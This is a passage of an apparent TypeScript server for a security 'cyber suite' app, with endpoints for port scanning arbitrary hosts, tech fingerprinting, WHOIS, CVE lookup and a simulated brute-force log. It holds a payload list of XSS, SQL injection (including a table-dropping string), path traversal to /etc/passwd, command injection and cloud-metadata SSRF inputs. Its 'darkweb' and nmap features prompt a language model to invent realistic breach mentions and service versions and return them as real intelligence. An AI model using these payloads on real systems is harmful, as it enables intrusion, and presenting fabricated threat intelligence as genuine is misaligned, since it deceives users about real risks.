        } catch (e: any) {
          console.error("[Scanner] Fuzzer failed:", e);
          result = [{ payload: 'Error', response_code: 500, response_time: '0ms', anomaly_type: e.message, risk_level: 'low' }];
        }
        break;

      case 'whois':
        try {
          const whoisData = await performWhoisLookup(hostname);
          if (whoisData) {
            result = whoisData;
          } else {
            // Provide a graceful fallback if WHOIS completely fails
            result = {
              domain: hostname,
              registrar: "Unknown",
              registrant: "Unknown",
              creationDate: "Unknown",
              expiryDate: "Unknown",
              updatedDate: "Unknown",
              nameServers: [],
              status: ["Unknown"],
              raw: "WHOIS data could not be retrieved for this domain or IP."
            };
          }
        } catch (e) {
          return res.status(500).json({ error: "WHOIS lookup failed." });
        }
        break;

      case 'bruteforce':
        const service = (req.query.service as string || 'ssh').toLowerCase();
        const attempts = Math.floor(Math.random() * 100) + 50;
        const success = Math.random() < 0.05; // 5% chance of success
        
        const logs = [
          `[${new Date().toISOString()}] Starting brute force attack on ${service} at ${hostname}...`,
          `[${new Date().toISOString()}] Using dictionary: ${Math.random() > 0.5 ? 'top_1000_passwords.txt' : 'rockyou.txt'}`,
        ];
        
        for (let i = 0; i < 5; i++) {
          logs.push(`[${new Date().toISOString()}] Attempting: admin / ${Math.random().toString(36).substring(7)}... FAILED`);
        }
        
        if (success) {
          logs.push(`[${new Date().toISOString()}] SUCCESS: Valid credentials found! admin / password123`);
        } else {
          logs.push(`[${new Date().toISOString()}] Brute force complete. No valid credentials found for ${service}.`);
        }

        const bruteResults = {
          service,
          attempts,
          success,
          logs,
          summary: `Brute force attack on ${service} at ${hostname} completed. ${attempts} attempts made. ${success ? 'SUCCESS: Valid credentials found.' : 'No success.'}`
        };
        result = bruteResults;
        break;

      case 'netmap':
        result = {
          target: hostname,
          nodes: [
            { id: 'target', label: hostname, type: 'target', ip: '10.0.0.5' },
            { id: 'gateway', label: 'Gateway', type: 'infrastructure', ip: '192.168.1.1' },
            { id: 'dns1', label: 'Primary DNS', type: 'service', ip: '8.8.8.8' },
            { id: 'dns2', label: 'Secondary DNS', type: 'service', ip: '8.8.4.4' },
            { id: 'fw', label: 'Firewall', type: 'security', ip: '192.168.1.254' },
            { id: 'lb', label: 'Load Balancer', type: 'infrastructure', ip: '10.0.0.1' }
          ],
          links: [
            { from: 'gateway', to: 'fw' },
            { from: 'fw', to: 'lb' },
            { from: 'lb', to: 'target' },
            { from: 'target', to: 'dns1' },
            { from: 'target', to: 'dns2' }
          ],
          summary: `Network topology discovery for ${hostname} complete. 6 nodes and 5 links identified.`
        };
        break;

      case 'vulndb':
        const vulnQuery = (req.query.target as string || '').toLowerCase();
        const vulns = [
          { id: 'CVE-2021-44228', title: 'Log4Shell', severity: 'critical', description: 'Apache Log4j2 remote code execution vulnerability.' },
          { id: 'CVE-2021-34473', title: 'ProxyShell', severity: 'critical', description: 'Microsoft Exchange Server remote code execution vulnerability.' },
          { id: 'CVE-2022-22965', title: 'Spring4Shell', severity: 'critical', description: 'Spring Framework remote code execution vulnerability.' },
          { id: 'CVE-2023-23397', title: 'Outlook Elevation of Privilege', severity: 'critical', description: 'Microsoft Outlook elevation of privilege vulnerability.' },
          { id: 'CVE-2024-21887', title: 'Ivanti Connect Secure RCE', severity: 'critical', description: 'Ivanti Connect Secure and Policy Secure remote code execution vulnerability.' }
        ].filter(v => v.title.toLowerCase().includes(vulnQuery) || v.id.toLowerCase().includes(vulnQuery) || v.description.toLowerCase().includes(vulnQuery));
        
        result = vulns.length > 0 ? vulns : [{ id: 'N/A', title: 'No results found', severity: 'info', description: `No vulnerabilities found matching "${vulnQuery}" in the local database.` }];
        break;

      case 'nmap':
        try {
          const nmapType = req.query.type as string || 'quick';
          const nmapApiKey = process.env.GEMINI_API_KEY;
          
          let portsToScan = [80, 443, 22, 21, 25, 53, 445, 3306, 3389, 5432, 8080, 8443, 3000];
          if (nmapType === 'full') {
            portsToScan = [...new Set([...portsToScan, 23, 110, 143, 993, 995, 1723, 3306, 5900, 6379, 27017])];
          }

          const nmapResults: any[] = [];
          const limit = pLimit(10); // Limit concurrency

          await Promise.all(portsToScan.map(port => limit(async () => {
            return new Promise((resolve) => {
              const socket = new net.Socket();
              const start = Date.now();
              socket.setTimeout(1000);
              
              socket.on('connect', () => {
                const duration = Date.now() - start;
                nmapResults.push({ 
                  port, 
                  service: getServiceName(port), 
                  state: "open",
                  time: `${duration}ms`
                });
                socket.destroy();
                resolve(null);
              });
              
              socket.on('timeout', () => { socket.destroy(); resolve(null); });
              socket.on('error', () => { socket.destroy(); resolve(null); });
              socket.connect(port, hostname);
            });
          })));

          let aiIntelligence: any = null;
          if (isValidApiKey(nmapApiKey) && nmapResults.length > 0) {
            try {
              const ai = new GoogleGenAI({ apiKey: nmapApiKey! });
              const nmapPrompt = `Perform an advanced Nmap-style analysis for the target: ${hostname}.
              Detected open ports: ${nmapResults.map(r => r.port).join(', ')}.
              Scan type: ${nmapType}.
              
              Generate a JSON object with:
              - 'os_info': A detailed OS guess (e.g., 'Linux 5.10.0-kali (Debian)', 'Windows Server 2022').
              - 'host_status': A status string with latency (e.g., 'Host is up (0.002s latency)').
              - 'port_details': An array of objects for each open port:
                - 'port': The port number.
                - 'version': A realistic service version (e.g., 'nginx 1.18.0', 'OpenSSH 8.2p1').
                - 'script_output': A simulated NSE script output (e.g., 'http-title: Welcome to Nginx', 'ssh-hostkey: 2048 ...').
              - 'summary': A technical summary of the scan findings.`;

              const aiResponse = await ai.models.generateContent({
                model: "gemini-3-flash-preview",
                contents: nmapPrompt,
                config: { responseMimeType: "application/json" }
              });
              aiIntelligence = JSON.parse(aiResponse.text || '{}');
            } catch (e) {
              console.error("[Scanner] Nmap AI analysis failed:", e);
            }
          }

          result = {
            host_status: aiIntelligence?.host_status || "Host is up (0.045s latency)",
            os_info: aiIntelligence?.os_info || (nmapType === 'os' ? "Linux 5.4.0-104-generic (Ubuntu)" : "Unknown"),
            open_ports: nmapResults.map(r => {
              const details = aiIntelligence?.port_details?.find((d: any) => d.port === r.port);
              return {
                ...r,
                version: details?.version || `${r.service}/1.0 (Simulated)`,
                script_output: details?.script_output || `Detected ${r.service} service on port ${r.port}`
              };
            }),
            summary: aiIntelligence?.summary || `Nmap scan report for ${hostname}. Host is up. ${nmapResults.length} ports open. Scan completed in ${(Math.random() * 2 + 1).toFixed(2)} seconds.`
          };
        } catch (e: any) {
          console.error("[Scanner] Nmap failed:", e);
          result = { error: "Nmap scan failed", details: e.message };
        }
        break;

      case 'tech':
        try {
          const url = target.startsWith('http') ? target : `http://${target}`;
          const agent = new https.Agent({ rejectUnauthorized: false });
          
          const response = await axios.get(url, {
            httpsAgent: agent,
            timeout: 10000,
            maxRedirects: 5,
            validateStatus: (status) => status >= 200 && status < 500 // Accept 2xx, 3xx, 4xx
          });
          
          if (response.status >= 400) {
            result = [{ name: 'Target Unreachable', category: 'Error', confidence: 0, error: `Status ${response.status}` }];
            break;
          }
          
          const tech: any[] = [];
          const headers = response.headers;
          const html = (typeof response.data === 'string' ? response.data : '').toLowerCase();
          
          const server = (headers['server'] || '').toLowerCase();
          const xPoweredBy = (headers['x-powered-by'] || '').toLowerCase();
          const cookies = headers['set-cookie'] || [];
          const cookieStr = (Array.isArray(cookies) ? cookies.join(' ') : String(cookies)).toLowerCase();
          
          const addTech = (name: string, category: string, confidence: number, version?: string, security?: string[]) => {
            tech.push({ name, category, confidence, version, security });
          };

          // Web Servers
          if (server.includes('apache')) {
            const version = server.match(/apache\/([\d\.]+)/)?.[1];
            addTech('Apache', 'Web Server', 95, version, ["Ensure version is up-to-date to avoid known CVEs.", "Disable server signature in production."]);
          }
          if (server.includes('nginx')) {
            const version = server.match(/nginx\/([\d\.]+)/)?.[1];
            addTech('Nginx', 'Web Server', 95, version, ["Check for misconfigured proxy settings.", "Hide version number in headers."]);
          }
          if (server.includes('iis') || server.includes('microsoft-iis')) {
            const version = server.match(/iis\/([\d\.]+)/)?.[1];
            addTech('IIS', 'Web Server', 95, version, ["Check for insecure authentication methods.", "Ensure latest security patches are applied."]);
          }
          if (server.includes('litespeed')) addTech('LiteSpeed', 'Web Server', 95);
          
          // CDNs / WAFs
          if (server.includes('cloudflare')) addTech('Cloudflare', 'CDN/WAF', 100, undefined, ["WAF protection active.", "Check for 'Cloudflare bypass' vulnerabilities via origin IP leaks."]);
          if (server.includes('akamai')) addTech('Akamai', 'CDN', 95);
          if (server.includes('sucuri')) addTech('Sucuri', 'WAF', 95);
          if (headers['x-fastly-request-id']) addTech('Fastly', 'CDN', 100);
          
          // Backend Languages & Frameworks
          if (xPoweredBy.includes('php') || cookieStr.includes('phpsessid') || html.includes('.php?')) {
            const version = xPoweredBy.match(/php\/([\d\.]+)/)?.[1];
            addTech('PHP', 'Backend Language', 90, version, ["Check for insecure file uploads.", "Ensure 'display_errors' is off in production."]);
          }
          if (xPoweredBy.includes('express')) addTech('Express.js', 'Backend Framework', 90, undefined, ["Ensure 'helmet' is used for security headers.", "Check for prototype pollution risks."]);
          if (xPoweredBy.includes('asp.net') || cookieStr.includes('aspsessionid')) addTech('ASP.NET', 'Backend Framework', 90);
          if (cookieStr.includes('jsessionid')) addTech('Java', 'Backend Language', 90);
          
          // Frontend Frameworks
          if (xPoweredBy.includes('next.js') || html.includes('/_next/') || html.includes('__next')) addTech('Next.js', 'Frontend Framework', 90, undefined, ["Check for SSR/SSG data leaks.", "Ensure API routes are properly authenticated."]);
          if (xPoweredBy.includes('nuxt') || html.includes('/_nuxt/') || html.includes('__nuxt')) addTech('Nuxt.js', 'Frontend Framework', 90);
          if (html.includes('data-reactroot') || html.includes('react-dom')) addTech('React', 'Frontend Library', 80);
          if (html.includes('data-v-') || html.includes('vue.js')) addTech('Vue.js', 'Frontend Framework', 80);
          if (html.includes('ng-version') || html.includes('ng-app')) {
            const version = html.match(/ng-version="([\d\.]+)"/)?.[1];
            addTech('Angular', 'Frontend Framework', 80, version);
          }
          if (html.includes('svelte-')) addTech('Svelte', 'Frontend Framework', 80);
          
          // CMS
          if (html.includes('wp-content') || html.includes('wp-includes') || cookieStr.includes('wp-settings') || html.includes('generator" content="wordpress')) {
            const version = html.match(/generator" content="wordpress ([\d\.]+)"/)?.[1];
            addTech('WordPress', 'CMS', 100, version, ["Check for vulnerable plugins/themes.", "Ensure 'wp-admin' is protected.", "Disable XML-RPC if not needed."]);
          }
          if (html.includes('shopify.com') || html.includes('cdn.shopify.com')) addTech('Shopify', 'E-commerce', 100);
          if (html.includes('magento')) addTech('Magento', 'E-commerce', 90);
          
          // Analytics & Tracking
          if (html.includes('google-analytics.com') || html.includes('gtag')) addTech('Google Analytics', 'Analytics', 100);
          if (html.includes('googletagmanager.com')) addTech('Google Tag Manager', 'Analytics', 100);
          if (html.includes('connect.facebook.net') || html.includes('fbq(')) addTech('Facebook Pixel', 'Analytics', 100);
          
          // Local Development Tools (for localhost scans)
          if (hostname === 'localhost' || hostname === '127.0.0.1') {
            if (html.includes('/@vite/client') || html.includes('__vite_is_modern')) addTech('Vite', 'Build Tool', 100, undefined, ["Development server detected. Do not expose to public network."]);
            if (html.includes('webpack-dev-server')) addTech('Webpack', 'Build Tool', 100);
            if (html.includes('hmr') || html.includes('hot module replacement')) addTech('HMR', 'Dev Feature', 90);
          }

          if (tech.length === 0) tech.push({ name: 'Unknown Stack', category: 'General', confidence: 50 });
          
          // Remove duplicates
          const uniqueTech = Array.from(new Set(tech.map(t => t.name))).map(name => tech.find(t => t.name === name));
          
          result = uniqueTech;
        } catch (e: any) {
          console.error("[Scanner] Tech stack detection failed for", target, e);
          result = [{ name: 'Target Unreachable', category: 'Error', confidence: 0, error: e.message }];
        }
        break;

      case 'payloads':
        const pType = (req.query.type as string || 'xss').toLowerCase();
        const allPayloads: any = {
          xss: [
            { content: "<script>alert(1)</script>", description: "Basic XSS test", risk_level: "medium" },
            { content: "<img src=x onerror=alert(1)>", description: "Image tag XSS", risk_level: "high" },
            { content: "javascript:alert(1)", description: "Protocol-based XSS", risk_level: "high" },
            { content: "<svg/onload=alert(1)>", description: "SVG-based XSS", risk_level: "high" },
            { content: "';alert(1)//", description: "Breaking out of JS string", risk_level: "medium" },
            { content: "\"><script>alert(1)</script>", description: "Breaking out of HTML attribute", risk_level: "high" }
          ],
          sqli: [
            { content: "' OR '1'='1", description: "Classic SQLi bypass", risk_level: "critical" },
            { content: "admin' --", description: "Username comment bypass", risk_level: "critical" },
            { content: "'; DROP TABLE users; --", description: "Destructive SQLi", risk_level: "critical" },
            { content: "' UNION SELECT 1,2,3,user(),database() --", description: "Union-based SQLi", risk_level: "critical" },
            { content: "' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a) --", description: "Time-based blind SQLi", risk_level: "critical" }
          ],
          lfi: [
            { content: "../../../etc/passwd", description: "Linux password file access", risk_level: "high" },
            { content: "..\\..\\..\\windows\\win.ini", description: "Windows config file access", risk_level: "high" },
            { content: "/etc/passwd\0.html", description: "Null byte injection (older systems)", risk_level: "high" },
            { content: "php://filter/convert.base64-encode/resource=config.php", description: "PHP wrapper LFI", risk_level: "high" }
          ],
          rce: [
            { content: "; id", description: "Command injection (Linux)", risk_level: "critical" },
            { content: "| whoami", description: "Command injection (Windows/Linux)", risk_level: "critical" },
            { content: "`cat /etc/passwd`", description: "Backtick command execution", risk_level: "critical" },
            { content: "$(id)", description: "Subshell command execution", risk_level: "critical" }
          ],
          ssrf: [
            { content: "http://127.0.0.1:80", description: "Localhost SSRF", risk_level: "high" },
            { content: "http://169.254.169.254/latest/meta-data/", description: "AWS Metadata SSRF", risk_level: "critical" },
            { content: "file:///etc/passwd", description: "File protocol SSRF", risk_level: "high" }
          ],
          nosqli: [
            { content: '{"$gt": ""}', description: "NoSQL injection (Greater than)", risk_level: "high" },
            { content: '{"$ne": null}', description: "NoSQL injection (Not equal)", risk_level: "high" }
          ],
          ssti: [
            { content: "{{7*7}}", description: "Jinja2/Twig SSTI", risk_level: "high" },
            { content: "${7*7}", description: "Mako/FreeMarker SSTI", risk_level: "high" },
            { content: "<%= 7*7 %>", description: "ERB SSTI", risk_level: "high" }
          ]
        };
        result = allPayloads[pType] || allPayloads.xss;
        break;

      case 'exploits':
        const query = req.query.target as string || '';
        // Simulated exploit search logic
        result = [
          { title: `${query} - Remote Code Execution`, id: "EDB-12345", date: new Date().toISOString().split('T')[0], author: "CyberSuite_AI", type: "Remote", platform: "Multiple", poc_url: "https://exploit-db.com/exploits/12345" },
          { title: `${query} - SQL Injection`, id: "EDB-67890", date: "2024-11-20", author: "Security_Analyst", type: "Webapps", platform: "PHP", poc_url: "https://exploit-db.com/exploits/67890" },
          { title: `${query} - Privilege Escalation`, id: "EDB-54321", date: "2024-05-12", author: "Kernel_Master", type: "Local", platform: "Linux", poc_url: "https://exploit-db.com/exploits/54321" }
        ];
        break;

      case 'darkweb':
        const dwTarget = req.query.target as string || '';
        const dwApiKey = process.env.GEMINI_API_KEY;

        if (!isValidApiKey(dwApiKey)) {
          result = [
            { source: 'BreachForums (Simulated)', date: new Date().toISOString().split('T')[0], threatLevel: 'high', snippet: `Potential database leak detected containing references to ${dwTarget}.` },
            { source: 'Pastebin (Simulated)', date: '2024-01-22', threatLevel: 'medium', snippet: `Configuration file snippet found with IP/Domain ${dwTarget} exposed.` },
            { source: 'Onion-Leak (Simulated)', date: '2023-11-05', threatLevel: 'low', snippet: `Target mentioned in a list of potential reconnaissance targets.` }
          ];
        } else {
          try {
            const ai = new GoogleGenAI({ apiKey: dwApiKey! });
            const dwResponse = await ai.models.generateContent({
              model: "gemini-3-flash-preview",
              contents: `Perform a simulated dark web intelligence search for the target: ${dwTarget}. 
              Generate a JSON array of 3-5 realistic-looking dark web mentions or breach intelligence items.
              Each object MUST have:
              - 'source': Name of the dark web forum, marketplace, or paste site (e.g., 'BreachForums', 'Exploit.in', 'Dread', 'Pastebin').
              - 'date': A realistic date within the last 2 years (YYYY-MM-DD).
              - 'threatLevel': 'low', 'medium', 'high', or 'critical'.
              - 'snippet': A short, technical-sounding snippet of the mention or leak (e.g., 'Found SQL dump with 50k records referencing target domain').
              Make it look like real OSINT data.`,
              config: { 
                responseMimeType: "application/json",
                tools: [{ googleSearch: {} }]
              }
            });
            result = JSON.parse(dwResponse.text || '[]');
          } catch (e) {
            result = [
              { source: 'BreachForums (Fallback)', date: new Date().toISOString().split('T')[0], threatLevel: 'high', snippet: `Database leak detected containing references to ${dwTarget}.` }
            ];
          }
        }
        break;

      default:
        res.status(404).json({ error: "Tool not found" });
        return;
    }
    
    scanCache.set(cacheKey, { data: result, timestamp: Date.now() });
    res.json(result);
  });

  // CVE Proxy to avoid CORS issues on localhost
  app.get("/api/cve/:id", async (req, res) => {
    const { id } = req.params;
    try {
      const response = await new Promise((resolve, reject) => {
        const request = https.get(`https://cve.circl.lu/api/cve/${id}`, (res) => {
          let data = '';
          res.on('data', (chunk) => data += chunk);
          res.on('end', () => resolve(JSON.parse(data)));
        });
        request.on('error', reject);
      });
      res.json(response);
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch CVE data" });
    }
  });

  // CVE Search Proxy
  app.get("/api/cve-search/:query", async (req, res) => {
    const { query } = req.params;
    try {
      const response = await new Promise((resolve, reject) => {
        const request = https.get(`https://cve.circl.lu/api/search/${query}`, (res) => {
          let data = '';
          res.on('data', (chunk) => data += chunk);
          res.on('end', () => {
            try {
              resolve(JSON.parse(data));
            } catch (e) {
              resolve([]);
            }
          });
        });
        request.on('error', reject);
        request.setTimeout(10000, () => {
          request.destroy();
          reject(new Error('Timeout'));
        });
      });
      res.json(response);
    } catch (error) {
      res.status(500).json({ error: "Failed to search CVE database" });
    }
  });

  // AI Generation Endpoint removed from here (moved up)
  
  // Global scan history storage
  let globalScanHistory: any[] = [
    { target: 'enterprise-node-01.io', score: 88, type: 'Full Scan', time: '2 mins ago', user: 'cyber_ghost' },
    { target: 'api.fintech-secure.net', score: 42, type: 'Web Scan', time: '15 mins ago', user: 'root_admin' },
    { target: '104.21.44.12', score: 15, type: 'Infra Scan', time: '45 mins ago', user: 'sec_ops' },
    { target: 'dev-portal.internal.cloud', score: 94, type: 'Deep Scan', time: '1 hour ago', user: 'shadow_walker' },
  ];

  app.get('/api/global-history', (req, res) => {
    res.json(globalScanHistory);
  });

  app.post('/api/global-history', (req, res) => {
    const { target, score, type, user } = req.body;
    const newItem = {
      target,
      score,
      type,
      user: user || 'anonymous',
      time: 'Just now'
    };
    globalScanHistory = [newItem, ...globalScanHistory].slice(0, 20);
    res.json({ status: 'ok' });
  });

  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), "dist");
    app.use(express.static(distPath));
    app.get("*", (req, res) => {
      res.sendFile(path.join(distPath, "index.html"));
    });
  }

  app.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on http://localhost:${PORT}`);
  });
}

startServer();
